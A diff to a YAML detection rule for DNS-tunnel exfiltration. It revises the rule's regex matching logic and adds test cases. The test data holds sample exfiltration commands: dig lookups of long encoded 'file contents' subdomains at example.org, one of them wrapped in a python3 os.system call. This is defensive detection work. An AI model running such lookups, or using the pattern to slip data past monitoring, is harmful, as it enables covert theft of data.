@@ -1,6 +1,6 @@
 id: dns-tunnel-exfiltration
 spec: threat-rules/v1.3  # needed for args and predicates
-version: 2
+version: 3
 title: DNS lookup of a long encoded subdomain (DNS tunnel exfil)
 description: >
   A DNS resolution command (dig / nslookup / host / drill) is run against a hostname whose
@@ -11,8 +11,8 @@ description: >
   The resolver is found by what the line runs and the long name must be one of its
   words, so it fires under sudo, inside `bash -c` and by path, and does not fire
   for the word host or a hash-named file elsewhere on the line, a commit message or
-  a here-document. A line the parser cannot vouch for (see command_unread) is
-  matched on its text.
+  a here-document. The text pattern is asked only of the text that reaches a command
+  the parser cannot see into (unread_text).
 severity: high
 status: stable
 posture: detect
@@ -30,9 +30,8 @@ match: >
       c.argv_raw.exists(a, a.matches("(?i)\\b[a-z0-9]{30,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b")) ||
       c.argv_raw.exists(a, a.matches("[$`]")) &&
         e.command.command.matches("(?i)\\b[a-z0-9]{30,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b"))) ||
-    (e.command.command.matches("(?i)\\b(dig|nslookup|host|drill)\\b") &&
-      e.command.command.matches("(?i)\\b[a-z0-9]{30,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b") &&
-      command_unread(e))
+    unread_text(e, t, t.matches("(?i)\\b(dig|nslookup|host|drill)\\b") &&
+      t.matches("(?i)\\b[a-z0-9]{30,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b"))
   )
 
 emit:
@@ -134,5 +133,17 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "dig +short partoneofthefileencodedlabel1.t.example.org" }
+        session: { id: s1 }
+  - name: lookup_handed_to_an_interpreter
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "python3 -c \"import os; os.system('dig +short partoneofthefilecontentsencodedaslabel01.t.example.org')\"" }
+        session: { id: s1 }
+  - name: lookup_named_in_a_commit_message_beside_a_project_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m 'test: dig partoneofthefilecontentsencodedaslabel01.t.example.org must fire' && ./run-tests.sh" }
         session: { id: s1 }
 
